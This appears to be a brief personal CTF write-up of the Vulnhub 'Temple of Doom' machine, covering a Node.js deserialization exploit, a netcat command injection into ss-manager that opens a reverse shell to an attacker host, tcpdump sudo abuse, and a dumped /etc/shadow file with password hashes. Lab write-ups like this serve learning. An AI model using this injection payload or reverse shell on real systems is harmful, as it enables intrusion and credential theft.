# Temple of Doom

Author: Vulnhub
Difficulty: 2
Key takeaway: try entering commands within nc even if there are no prompts and look for a response, try a rev shell even if it says err
Tags: Express, NodeJS, cookie, csrf, profile, ss-manager, tcpdump
Type: Linux

# Enumeration

- portscan

```bash

```

# Initial Access

- CVE-2017-5941 - exploited it to get a initial shell
- details: [https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf](https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf)
- got shell as `nodeadmin`

# Privilege Escalation

- Found some listening ports

```bash
[-] Listening TCP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::666                  :::*                    LISTEN      -                   

[-] Listening UDP:
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:34853           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp     7680      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:8839          0.0.0.0:*                           -                   
udp6    7680      0 :::5353                 :::*                                -                   
udp6       0      0 ::1:323                 :::*                                -
```

![https://miro.medium.com/max/700/1*c4lBnbwnwyv7JrmInVToVQ.png](https://miro.medium.com/max/700/1*c4lBnbwnwyv7JrmInVToVQ.png)

- the ss-manager executable was vulnerable
- just start the nc server and use this command inside it to get a reverse shell

```bash
nc -u 127.0.0.1 3389
add: {"server_port": 1234, "password": "test", "method": "||/bin/nc -e /bin/bash <attacking-ip> <port>||"}
```

- sudo -l on fireman :

```bash
User fireman may run the following commands on localhost:
    (ALL) NOPASSWD: /sbin/iptables
    (ALL) NOPASSWD: /usr/bin/nmcli
    (ALL) NOPASSWD: /usr/sbin/tcpdump
```

- refered to GTFO bins to get sudo from tcpdump

```bash
root:$6$jA85omnRVznNFM4j$voN29bYWJUlRbxgsqia46oC9IK/mdRK5B.IYUrJYs196sfA3ye3rSV790EoD76ABKu29CdtnAXQtIAo6OpNWc1:17681:0:99999:7:::
bin:*:17589:0:99999:7:::
daemon:*:17589:0:99999:7:::
adm:*:17589:0:99999:7:::
lp:*:17589:0:99999:7:::
sync:*:17589:0:99999:7:::
shutdown:*:17589:0:99999:7:::
halt:*:17589:0:99999:7:::
mail:*:17589:0:99999:7:::
operator:*:17589:0:99999:7:::
games:*:17589:0:99999:7:::
ftp:*:17589:0:99999:7:::
nobody:*:17589:0:99999:7:::
apache:!!:17646::::::
systemd-coredump:!!:17646::::::
systemd-network:!!:17646::::::
systemd-resolve:!!:17646::::::
dbus:!!:17646::::::
polkitd:!!:17646::::::
geoclue:!!:17646::::::
colord:!!:17646::::::
rtkit:!!:17646::::::
pulse:!!:17646::::::
gluster:!!:17646::::::
qemu:!!:17646::::::
avahi:!!:17646::::::
chrony:!!:17646::::::
dnsmasq:!!:17646::::::
rpc:!!:17646:0:99999:7:::
usbmuxd:!!:17646::::::
openvpn:!!:17646::::::
radvd:!!:17646::::::
saslauth:!!:17646::::::
nm-openvpn:!!:17646::::::
nm-openconnect:!!:17646::::::
abrt:!!:17646::::::
pipewire:!!:17646::::::
gdm:!!:17646::::::
rpcuser:!!:17646::::::
gnome-initial-setup:!!:17646::::::
vboxadd:!!:17646::::::
sshd:!!:17646::::::
tss:!!:17646::::::
tcpdump:!!:17646::::::
nginx:!!:17681::::::
mysql:!!:17681::::::
squid:!!:17681::::::
webalizer:!!:17681::::::
nodeadmin:$6$Irn2hnRs4FOa48.v$qMv9vxJJvG7IPAXrRLk95mwSst03RQ3.5AbZYHHQvt9Ly0.mBAsRG8NVbl/mjFvFHoAwh2lyFt4fU.SlVGBDH0:17681:0:99999:7:::
fireman:$6$BaIbY56JYCpGwJbh$/i8xxjqRpl72vhmw5zCzjdHtGt.0oq0S5f76c3YKFGBFciShcjlA.04rXZo3XhPd3SDiZw2djhaSAsdnz/./d.:17683:0:99999:7:::
```

# Notes

-